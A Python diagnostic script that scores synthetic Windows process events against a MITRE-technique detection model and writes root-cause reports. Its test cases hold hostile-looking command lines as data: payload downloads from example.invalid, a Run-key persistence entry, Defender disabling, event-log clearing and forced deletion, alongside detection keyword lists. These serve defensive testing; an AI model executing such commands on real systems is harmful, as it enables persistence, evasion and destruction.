import json
import re
import warnings
from pathlib import Path

import joblib
import numpy as np
import pandas as pd

warnings.filterwarnings("ignore")


# ============================================================
# PATHS
# ============================================================

ROOT = Path(r"C:\Users\Atharv\SmartSOC-AI")

MODEL_DIR = (
    ROOT
    / "models"
    / "windows_apt_v4_1"
    / "production"
)

REPORT_DIR = (
    ROOT
    / "reports"
    / "phase2_gate2_4a"
)

REPORT_DIR.mkdir(
    parents=True,
    exist_ok=True,
)


# ============================================================
# LOAD ARTIFACTS
# ============================================================

MODEL = joblib.load(
    MODEL_DIR / "model.joblib"
)

STRUCTURED_ENCODER = joblib.load(
    MODEL_DIR / "structured_encoder.joblib"
)

SCALER = joblib.load(
    MODEL_DIR / "numerical_scaler.joblib"
)

TFIDF = joblib.load(
    MODEL_DIR / "tfidf_vectorizer.joblib"
)

LABEL_ENCODER = joblib.load(
    MODEL_DIR / "multilabel_encoder.joblib"
)

with open(
    MODEL_DIR / "feature_schema.json",
    "r",
    encoding="utf-8",
) as f:
    SCHEMA = json.load(f)

with open(
    MODEL_DIR / "thresholds.json",
    "r",
    encoding="utf-8",
) as f:
    THRESHOLDS = json.load(f)["thresholds"]


CATEGORICAL_COLUMNS = (
    SCHEMA["categorical_columns"]
)

NUMERICAL_COLUMNS = (
    SCHEMA["numerical_columns"]
)

STRUCTURED_COLUMNS = (
    CATEGORICAL_COLUMNS
    + NUMERICAL_COLUMNS
)

TECHNIQUES = list(
    LABEL_ENCODER.classes_
)


# ============================================================
# LOAD TRAINING DATA
# ============================================================

DATA_DIR = (
    ROOT
    / "data"
    / "processed"
    / "windows_apt_v4_1"
)

STRUCTURED_TRAIN = pd.read_csv(
    DATA_DIR / "structured_train.csv"
)

LABELS_TRAIN = pd.read_csv(
    DATA_DIR / "labels_train.csv"
)

BEHAVIOR_TRAIN = pd.read_csv(
    DATA_DIR / "behavior_text_train.csv"
)


# ============================================================
# TEXT NORMALIZATION
# ============================================================

def clean_text(value):

    if value is None:
        return ""

    value = str(value).lower()

    value = re.sub(
        r"[^a-z0-9]+",
        " ",
        value,
    )

    value = re.sub(
        r"\s+",
        " ",
        value,
    )

    return value.strip()


# ============================================================
# CONTROLLED EVENTS
# ============================================================

def make_event(
    event_id,
    process_name,
    parent_process_name,
    command_line,
    system_level=4,
    user="SYSTEM",
):

    process_name = clean_text(
        process_name
    )

    parent_process_name = clean_text(
        parent_process_name
    )

    command_line = clean_text(
        command_line
    )

    user = clean_text(
        user
    )

    text = " ".join(
        x
        for x in [
            process_name,
            parent_process_name,
            command_line,
        ]
        if x
    )

    has_cmd = int(
        "cmd.exe" in text
        or re.search(
            r"\bcmd\b",
            text,
        ) is not None
    )

    has_powershell = int(
        "powershell.exe" in text
        or "powershell" in text
    )

    has_rundll32 = int(
        "rundll32" in text
    )

    has_wscript = int(
        "wscript" in text
    )

    has_cscript = int(
        "cscript" in text
    )

    has_mshta = int(
        "mshta" in text
    )

    has_regsvr32 = int(
        "regsvr32" in text
    )

    has_schtasks = int(
        "schtasks" in text
    )

    has_reg = int(
        re.search(
            r"\breg(?:\.exe)?\b",
            text,
        ) is not None
    )

    has_wmic = int(
        "wmic" in text
    )

    has_net = int(
        re.search(
            r"\bnet(?:\.exe)?\b",
            text,
        ) is not None
    )

    has_whoami = int(
        "whoami" in text
    )

    has_certutil = int(
        "certutil" in text
    )

    has_bitsadmin = int(
        "bitsadmin" in text
    )

    has_ipconfig = int(
        "ipconfig" in text
    )

    has_netstat = int(
        "netstat" in text
    )

    has_tasklist = int(
        "tasklist" in text
    )

    has_sc = int(
        re.search(
            r"\bsc(?:\.exe)?\b",
            text,
        ) is not None
    )

    has_wevtutil = int(
        "wevtutil" in text
    )

    has_vssadmin = int(
        "vssadmin" in text
    )

    has_encoded = int(
        "-enc" in text
        or "-encodedcommand" in text
        or "frombase64string" in text
    )

    has_download = int(
        any(
            term in text
            for term in [
                "invoke-webrequest",
                "downloadstring",
                "downloadfile",
                "curl ",
                "wget ",
                "bitsadmin",
                "certutil",
                "http://",
                "https://",
            ]
        )
    )

    has_remote = int(
        any(
            term in text
            for term in [
                "psexec",
                "winrm",
                "invoke-command",
                "enter-pssession",
                "wmic /node",
                "remote",
            ]
        )
    )

    has_registry = int(
        any(
            term in text
            for term in [
                "reg add",
                "reg delete",
                "reg.exe add",
                "reg.exe delete",
                "registry",
            ]
        )
    )

    has_file_deletion = int(
        any(
            term in text
            for term in [
                "del ",
                "erase ",
                "remove-item",
                "rm ",
                "rmdir",
                "delete",
            ]
        )
    )

    has_obfuscation = int(
        any(
            term in text
            for term in [
                "encodedcommand",
                "frombase64string",
                "iex(",
                "invoke-expression",
                "obfusc",
                "^",
            ]
        )
    )

    has_target_filename = int(
        any(
            ext in text
            for ext in [
                ".exe",
                ".dll",
                ".ps1",
                ".vbs",
                ".js",
                ".bat",
                ".cmd",
            ]
        )
    )

    has_image_loaded = int(
        ".dll" in text
    )

    has_target_object = int(
        any(
            term in text
            for term in [
                "service",
                "registry",
                "scheduled task",
                "task",
            ]
        )
    )

    administrative_powershell_context = int(
        has_powershell
        and (
            user.upper()
            in {
                "SYSTEM",
                "ADMINISTRATOR",
            }
            or system_level == 4
        )
    )

    strong_behavior_signal = int(
        any(
            [
                has_encoded,
                has_download,
                has_remote,
                has_registry,
                has_file_deletion,
                has_obfuscation,
            ]
        )
    )

    return {
        "event_id": float(event_id),
        "system_level": float(system_level),
        "is_sysmon": 1,
        "is_security_channel": 0,

        "process_name": process_name,
        "parent_process_name":
            parent_process_name,

        "process_extension": (
            process_name.rsplit(
                ".",
                1,
            )[-1]
            if "." in process_name
            else ""
        ),

        "parent_extension": (
            parent_process_name.rsplit(
                ".",
                1,
            )[-1]
            if "." in parent_process_name
            else ""
        ),

        "has_process_image":
            int(bool(process_name)),

        "has_parent_image":
            int(bool(parent_process_name)),

        "has_user":
            int(bool(user)),

        "has_parent_user": 0,

        "is_system_user":
            int(user.upper() == "SYSTEM"),

        "is_admin_user":
            int(user.upper() == "ADMINISTRATOR"),

        "integrity_high":
            int(system_level == 4),

        "integrity_medium":
            int(system_level != 4),

        "command_length":
            len(command_line),

        "parent_command_length": 0,

        "has_command_line":
            int(bool(command_line)),

        "has_parent_command": 0,

        "uses_powershell":
            has_powershell,

        "uses_cmd":
            has_cmd,

        "uses_net":
            has_net,

        "uses_whoami":
            has_whoami,

        "uses_schtasks":
            has_schtasks,

        "uses_reg":
            has_reg,

        "uses_rundll32":
            has_rundll32,

        "uses_wmic":
            has_wmic,

        "uses_certutil":
            has_certutil,

        "uses_bitsadmin":
            has_bitsadmin,

        "uses_ipconfig":
            has_ipconfig,

        "uses_netstat":
            has_netstat,

        "uses_tasklist":
            has_tasklist,

        "uses_sc":
            has_sc,

        "uses_mshta":
            has_mshta,

        "uses_regsvr32":
            has_regsvr32,

        "uses_cscript":
            has_cscript,

        "uses_wscript":
            has_wscript,

        "uses_wevtutil":
            has_wevtutil,

        "uses_vssadmin":
            has_vssadmin,

        "has_encoded_command":
            has_encoded,

        "has_download_behavior":
            has_download,

        "has_remote_execution_hint":
            has_remote,

        "has_registry_operation":
            has_registry,

        "has_file_deletion":
            has_file_deletion,

        "has_obfuscation_hint":
            has_obfuscation,

        "same_process_parent":
            int(
                bool(process_name)
                and process_name
                == parent_process_name
            ),

        "suspicious_parent_wazuh":
            int(
                "wazuh"
                in parent_process_name
            ),

        "has_hash": 0,
        "has_sha256": 0,
        "has_md5": 0,

        "has_source_ip": 0,
        "has_destination_ip": 0,
        "has_source_port": 0,
        "has_destination_port": 0,
        "has_protocol": 0,
        "is_network_event": 0,

        "has_target_filename":
            has_target_filename,

        "has_image_loaded":
            has_image_loaded,

        "has_target_object":
            has_target_object,

        "administrative_powershell_context":
            administrative_powershell_context,

        "strong_behavior_signal":
            strong_behavior_signal,
    }


# ============================================================
# MALICIOUS TEST CASES
# ============================================================

CASES = [

    {
        "id": "MALICIOUS_001",
        "expected": [
            "T1059.001",
            "T1027.004",
        ],
        "description":
            "Encoded PowerShell execution",
        "event": make_event(
            1001,
            "powershell.exe",
            "winword.exe",
            "powershell.exe -EncodedCommand "
            "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
        ),
    },

    {
        "id": "MALICIOUS_002",
        "expected": [
            "T1059.003",
        ],
        "description":
            "Command shell discovery",
        "event": make_event(
            1002,
            "cmd.exe",
            "winword.exe",
            "cmd.exe /c whoami && net user "
            "&& net localgroup administrators",
        ),
    },

    {
        "id": "MALICIOUS_003",
        "expected": [
            "T1105",
        ],
        "description":
            "PowerShell payload download",
        "event": make_event(
            1003,
            "powershell.exe",
            "cmd.exe",
            "powershell.exe -c "
            "Invoke-WebRequest "
            "https://example.invalid/payload.exe "
            "-OutFile C:\\Temp\\payload.exe",
        ),
    },

    {
        "id": "MALICIOUS_004",
        "expected": [
            "T1059.001",
            "T1112",
        ],
        "description":
            "Registry Run-key modification",
        "event": make_event(
            1004,
            "powershell.exe",
            "explorer.exe",
            "powershell.exe -c "
            "reg add "
            "HKCU\\Software\\Microsoft\\Windows\\"
            "CurrentVersion\\Run "
            "/v Update /t REG_SZ "
            "/d C:\\Temp\\update.exe /f",
        ),
    },

    {
        "id": "MALICIOUS_005",
        "expected": [
            "T1543.003",
        ],
        "description":
            "Windows service creation",
        "event": make_event(
            1005,
            "sc.exe",
            "cmd.exe",
            "sc.exe create UpdateService "
            "binPath= C:\\Temp\\payload.exe "
            "start= auto",
        ),
    },

    {
        "id": "MALICIOUS_006",
        "expected": [
            "T1059.001",
            "T1070.004",
        ],
        "description":
            "PowerShell file deletion",
        "event": make_event(
            1006,
            "powershell.exe",
            "cmd.exe",
            "powershell.exe -c "
            "Remove-Item "
            "C:\\Temp\\logs\\* -Force",
        ),
    },

    {
        "id": "MALICIOUS_007",
        "expected": [
            "T1562.001",
        ],
        "description":
            "Security-tool disabling",
        "event": make_event(
            1007,
            "powershell.exe",
            "cmd.exe",
            "powershell.exe -c "
            "Set-MpPreference "
            "-DisableRealtimeMonitoring $true",
        ),
    },

    {
        "id": "MALICIOUS_008",
        "expected": [
            "T1059.003",
            "T1070.004",
        ],
        "description":
            "Windows event log clearing",
        "event": make_event(
            1008,
            "cmd.exe",
            "splunkd.exe",
            "cmd.exe /c wevtutil cl System",
        ),
    },

    {
        "id": "MALICIOUS_009",
        "expected": [
            "T1059.003",
        ],
        "description":
            "Certutil download",
        "event": make_event(
            1009,
            "cmd.exe",
            "winword.exe",
            "cmd.exe /c certutil "
            "-urlcache -split -f "
            "https://example.invalid/a.exe "
            "a.exe",
        ),
    },

    {
        "id": "MALICIOUS_010",
        "expected": [
            "T1059.003",
            "T1485",
        ],
        "description":
            "Destructive deletion",
        "event": make_event(
            1010,
            "cmd.exe",
            "powershell.exe",
            "cmd.exe /c "
            "del /f /q "
            "C:\\Temp\\victim.txt",
        ),
    },
]


# ============================================================
# PRODUCTION-LIKE BEHAVIOR TEXT
# ============================================================

BEHAVIOR_COLUMNS = [
    "process_name",
    "parent_process_name",
    "command_length",
    "uses_powershell",
    "uses_cmd",
    "uses_net",
    "uses_whoami",
    "uses_schtasks",
    "uses_reg",
    "uses_rundll32",
    "uses_wmic",
    "uses_certutil",
    "uses_bitsadmin",
    "uses_ipconfig",
    "uses_netstat",
    "uses_tasklist",
    "uses_sc",
    "uses_mshta",
    "uses_regsvr32",
    "uses_cscript",
    "uses_wscript",
    "uses_wevtutil",
    "uses_vssadmin",
    "has_encoded_command",
    "has_download_behavior",
    "has_remote_execution_hint",
    "has_registry_operation",
    "has_file_deletion",
    "has_obfuscation_hint",
    "strong_behavior_signal",
]


def build_behavior_text(df):

    return df.apply(
        lambda row: " ".join(
            str(row[column])
            for column in BEHAVIOR_COLUMNS
        ),
        axis=1,
    )


# ============================================================
# TRANSFORM
# ============================================================

def transform_controlled(events):

    structured = pd.DataFrame(
        [
            x["event"]
            for x in events
        ]
    )

    structured = structured[
        STRUCTURED_COLUMNS
    ].copy()

    categorical = (
        STRUCTURED_ENCODER.transform(
            structured[
                CATEGORICAL_COLUMNS
            ]
        )
    )

    numerical = (
        SCALER.transform(
            structured[
                NUMERICAL_COLUMNS
            ]
        )
    )

    behavior_text = build_behavior_text(
        structured
    )

    tfidf = TFIDF.transform(
        behavior_text
    )

    from scipy.sparse import hstack

    final = hstack(
        [
            categorical,
            numerical,
            tfidf,
        ]
    ).tocsr()

    return (
        structured,
        behavior_text,
        final,
    )


# ============================================================
# TRAINING REPRESENTATION ANALYSIS
# ============================================================

def analyze_training_technique(
    technique
):

    labels = (
        LABELS_TRAIN["techniques"]
        .fillna("")
        .astype(str)
    )

    mask = labels.apply(
        lambda value:
        technique in {
            x.strip()
            for x in value.split(",")
            if x.strip()
        }
    )

    rows = STRUCTURED_TRAIN.loc[
        mask
    ].copy()

    if rows.empty:

        return {
            "training_rows": 0
        }

    output = {
        "training_rows":
            int(len(rows))
    }

    important_columns = [
        "uses_powershell",
        "uses_cmd",
        "has_encoded_command",
        "has_download_behavior",
        "has_remote_execution_hint",
        "has_registry_operation",
        "has_file_deletion",
        "has_obfuscation_hint",
        "strong_behavior_signal",
        "uses_certutil",
        "uses_wevtutil",
        "uses_sc",
        "has_target_filename",
        "has_target_object",
    ]

    for column in important_columns:

        if column in rows.columns:

            output[
                column
            ] = float(
                rows[column]
                .mean()
            )

    return output


# ============================================================
# MAIN ANALYSIS
# ============================================================

def main():

    print()
    print("=" * 78)
    print("SMARTSOC PHASE 2 GATE 2.4A")
    print("MALICIOUS INFERENCE ROOT-CAUSE ANALYSIS")
    print("=" * 78)

    (
        structured,
        behavior_text,
        X,
    ) = transform_controlled(
        CASES
    )

    probabilities = (
        MODEL.predict_proba(X)
    )

    print()
    print(
        f"Controlled events : "
        f"{len(CASES)}"
    )

    print(
        f"Final matrix      : "
        f"{X.shape}"
    )

    results = []

    for i, case in enumerate(CASES):

        probs = probabilities[i]

        ranked = np.argsort(
            probs
        )[::-1]

        expected = set(
            case["expected"]
        )

        top_index = ranked[0]

        top_technique = str(
            TECHNIQUES[top_index]
        )

        top_probability = float(
            probs[top_index]
        )

        top_threshold = float(
            THRESHOLDS.get(
                top_technique,
                0.5,
            )
        )

        print()
        print("-" * 78)
        print(
            f"{case['id']} | "
            f"{case['description']}"
        )

        print(
            f"Expected: "
            f"{sorted(expected)}"
        )

        print(
            f"Top prediction: "
            f"{top_technique} "
            f"{top_probability:.4f}"
        )

        print()

        print(
            "Top 5 model probabilities:"
        )

        top5 = []

        for index in ranked[:5]:

            technique = str(
                TECHNIQUES[index]
            )

            probability = float(
                probs[index]
            )

            threshold = float(
                THRESHOLDS.get(
                    technique,
                    0.5,
                )
            )

            print(
                f"  {technique:<12} "
                f"{probability:.6f} "
                f"(threshold "
                f"{threshold:.3f})"
            )

            top5.append(
                (
                    technique,
                    probability,
                )
            )

        # ----------------------------------------------------
        # Feature summary
        # ----------------------------------------------------

        feature_summary = {}

        for column in [
            "uses_powershell",
            "uses_cmd",
            "uses_net",
            "uses_whoami",
            "uses_certutil",
            "uses_sc",
            "uses_wevtutil",
            "has_encoded_command",
            "has_download_behavior",
            "has_remote_execution_hint",
            "has_registry_operation",
            "has_file_deletion",
            "has_obfuscation_hint",
            "has_target_filename",
            "has_target_object",
            "strong_behavior_signal",
        ]:

            feature_summary[column] = int(
                structured.iloc[i][column]
            )

        # ----------------------------------------------------
        # Expected-technique training profiles
        # ----------------------------------------------------

        for technique in sorted(
            expected
        ):

            profile = (
                analyze_training_technique(
                    technique
                )
            )

            print()
            print(
                f"Training profile: "
                f"{technique}"
            )

            print(
                f"  rows = "
                f"{profile.get('training_rows', 0)}"
            )

            for key, value in profile.items():

                if key == "training_rows":
                    continue

                print(
                    f"  {key:<35}"
                    f" {value:.4f}"
                )

        # ----------------------------------------------------
        # Save result
        # ----------------------------------------------------

        row = {
            "case_id":
                case["id"],

            "description":
                case["description"],

            "expected_techniques":
                ",".join(
                    sorted(expected)
                ),

            "top_technique":
                top_technique,

            "top_probability":
                top_probability,

            "top_threshold":
                top_threshold,

            "process_name":
                structured.iloc[i][
                    "process_name"
                ],

            "parent_process_name":
                structured.iloc[i][
                    "parent_process_name"
                ],

            "behavior_text":
                behavior_text.iloc[i],

        }

        row.update(
            feature_summary
        )

        for rank, (
            technique,
            probability,
        ) in enumerate(
            top5,
            start=1,
        ):

            row[
                f"top{rank}_technique"
            ] = technique

            row[
                f"top{rank}_probability"
            ] = probability

        results.append(row)

    results_df = pd.DataFrame(
        results
    )

    results_path = (
        REPORT_DIR
        / "malicious_root_cause_results.csv"
    )

    results_df.to_csv(
        results_path,
        index=False,
    )

    # --------------------------------------------------------
    # Training profile report
    # --------------------------------------------------------

    profile_rows = []

    all_expected = sorted(
        {
            technique
            for case in CASES
            for technique
            in case["expected"]
        }
    )

    for technique in all_expected:

        profile = (
            analyze_training_technique(
                technique
            )
        )

        profile["technique"] = (
            technique
        )

        profile_rows.append(
            profile
        )

    profile_df = pd.DataFrame(
        profile_rows
    )

    profile_path = (
        REPORT_DIR
        / "expected_technique_training_profiles.csv"
    )

    profile_df.to_csv(
        profile_path,
        index=False,
    )

    # --------------------------------------------------------
    # Report
    # --------------------------------------------------------

    report = {

        "phase":
            "Phase 2",

        "gate":
            "Gate 2.4A",

        "gate_name":
            "Malicious Inference Root-Cause Analysis",

        "status":
            "DIAGNOSTIC_COMPLETE",

        "production_artifacts_modified":
            False,

        "model_retrained":
            False,

        "thresholds_modified":
            False,

        "datasets_modified":
            False,

        "commands_executed":
            False,

        "controlled_cases":
            len(CASES),

        "final_feature_count":
            int(X.shape[1]),

        "mitre_classes":
            len(TECHNIQUES),

        "results_file":
            str(results_path),

        "training_profiles_file":
            str(profile_path),
    }

    report_path = (
        REPORT_DIR
        / "phase2_gate2_4a_report.json"
    )

    with open(
        report_path,
        "w",
        encoding="utf-8",
    ) as f:

        json.dump(
            report,
            f,
            indent=2,
        )

    print()
    print("=" * 78)
    print("GATE 2.4A COMPLETE")
    print("=" * 78)

    print(
        f"Results : "
        f"{results_path}"
    )

    print(
        f"Profiles: "
        f"{profile_path}"
    )

    print(
        f"Report  : "
        f"{report_path}"
    )

    print()
    print(
        "STATUS: DIAGNOSTIC_COMPLETE"
    )

    print("=" * 78)


if __name__ == "__main__":
    main()